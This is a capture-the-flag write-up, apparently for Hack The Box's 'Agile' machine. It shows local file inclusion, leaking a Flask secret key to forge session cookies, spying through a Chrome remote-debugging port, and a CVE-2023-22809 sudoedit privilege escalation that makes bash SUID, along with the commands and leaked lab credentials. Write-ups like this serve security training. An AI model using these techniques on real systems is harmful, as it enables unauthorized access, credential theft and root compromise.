# Agile

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.172.106
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 09:31 EST
Nmap scan report for 10.129.172.106
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We need to add `superpass.htb` to our `/etc/hosts` file to access port 80.

### SuperPassword --> LFI

The website advertised a password manager.

<figure><img src="../../.gitbook/assets/image (3117).png" alt=""><figcaption></figcaption></figure>

I tested by registering a user to see what functionalities this application has. I registed a username and got an error, revealing that this is a Flask application. Not sure if this was supposed to happen

<figure><img src="../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>

Anyways, when I tried again it worked and brought me to a dashboard where I can add a password and Export passwords.

<figure><img src="../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

The Export function looks rather exploitable. I added some passwords, then tried to download the file and was presented with this HTTP request:

```http
GET /download?fn=newuser_export_611199da8a.csv HTTP/1.1
Host: superpass.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: remember_token=9|8f50cc62e035672203937ef350c45d6a6780afafd9114b725dfb34ffa10cd42e92e484635b44b3f13d76ce1f6af818f2501684844daf93217e66ec4af933165f; session=.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZAX6Tg.txUnjeEEeD_3BB80vD96et6vwwU
Upgrade-Insecure-Requests: 1
```

The `fn` paramete was vulnerable to LFI.

<figure><img src="../../.gitbook/assets/image (833).png" alt=""><figcaption></figcaption></figure>

We find 4 users, `runner`, `corum`, `edwards`, and `dev_admin`. We know that this is a Flask application, so the source code for `app.py` is probably in some `/app/app/main` directory or something along those lines.  Some testing revealed that it was located in `../app/app/superpass/app.py`.

We can grab the SECRET\_KEY variable from here and be able to spoof our own cookies using `flask-unsign`.

```
app.config['SECRET_KEY'] = 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'
```

### Cookie Spoofing --> SSH Creds

Now that we have the SECRET\_KEY, we can decrypt the cookie.

{% code overflow="wrap" %}
```
$ flask-unsign --decode --cookie '.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZAX6Tg.txUnjeEEeD_3BB80vD96et6vwwU' --secret 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'
{'_fresh': True, '_id': '733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96', '_user_id': '9'}
```
{% endcode %}

Now, we can change the `_user_id` parameter and hopefully login as other users with stored passwords. We can keep changing the user ID to anything we want and keep getting different passwords. Here are some interesting ones:

```html
<td>hackthebox.com</td>
    <td>0xdf</td>
    <td>762b430d32eea2f12970</td>
<td>mgoblog.com</td>
    <td>0xdf</td>
    <td>5b133f7a6a1c180646cb</td>
<td>agile</td>
    <td>corum</td>
    <td>5db7caa1d13cc37c9fc2</td>
```

That last one for `corum` is a valid password for SSH.

<figure><img src="../../.gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>

Then we can easily grab the user flag.

## Privilege Escalation

### Chrome Debugging --> Edwards

I ran a LinPEAS scan and thsi was the one thing that stood out the most:

{% code overflow="wrap" %}
```
runner      3486  0.1  2.5 34023392 103408 ?     Sl   14:49   0:00                      _ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.MLKYLq --window-size=1420,1080 data:
```
{% endcode %}

It would appear that there is a --remote-debugging-port being used. Essentially, it means that this port is open and running Chrome. With credentials for SSH, we can port forward this and perhaps access it from our machine to see what the user is doing.

So we can first port forward this thing using `ssh`.

```bash
ssh -L 41829:127.0.0.1:41829 corum@superpass.htb
```

Afterwards, we can use Burpsuite's Chromium browser (that is in-built) to access this thing. This resource was rather helpful:

{% embed url="https://developers.google.com/cast/docs/debugging/remote_debugger" %}

Just add `localhost:41829` to the Discover Network Targets portion, and we will pick up on the target.

<figure><img src="../../.gitbook/assets/image (1838).png" alt=""><figcaption></figcaption></figure>

We can inspect this to basically spy on the user.&#x20;

<figure><img src="../../.gitbook/assets/image (969).png" alt=""><figcaption></figcaption></figure>

I visited the `/vault` directory and found some secret credentials.

<figure><img src="../../.gitbook/assets/image (2851).png" alt=""><figcaption></figcaption></figure>

Then, we can `su` to `edwards`.

### Sudoedit CVE-2023-22809

Checking `edwards` `sudo` privileges, we see this:

```bash
edwards@agile:/home/corum$ sudo -l
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

In short, we edit some files as `dev_admin`. I read files and found some credentials

{% code overflow="wrap" %}
```
# creds.txt
edwards:1d7ffjwrx#$d6qn!9nndqgde4
# config_test.json
"SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
```
{% endcode %}

However, the credentials here lead to dead ends, with the SQL database having nothing of interest. I ran a `pspy64` to see if there were any exploitable processes. This one line looked rather suspicious because `dev_admin` had write access to it:

{% code overflow="wrap" %}
```
2023/03/06 15:16:01 CMD: UID=0    PID=37141  | /bin/bash -c source /app/venv/bin/activate 

edwards@agile:/tmp$ ls -la /app/venv/bin/activate
-rw-rw-r-- 1 root dev_admin 1976 Mar  6 15:15 /app/venv/bin/activate
```
{% endcode %}

Checking the `sudo` version online, I found that it was vulnerable to CVE-2023-22809.

In short, this exploit allows us to write in **any file we want** using `sudoedit` despite the restrictions we have in place. The `activate` file I found earlier was a `bash` script being executed by root. So, all we need to do is append some commands to it to make `/bin/bash` an SUID binary.

{% embed url="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf" %}

Following the PoC, we just /app/venv/bin/activateave to execute these commands:

```bash
export EDITOR='vim -- /app/venv/bin/activate'
sudo -u dev_admin sudoedit /app/config_test.json
```

This opens up the `activate` file and we are free to edit it. We can add `chmod u+s /bin/bash` into it. Then we can easily become `root`.

<figure><img src="../../.gitbook/assets/image (565).png" alt=""><figcaption></figcaption></figure>
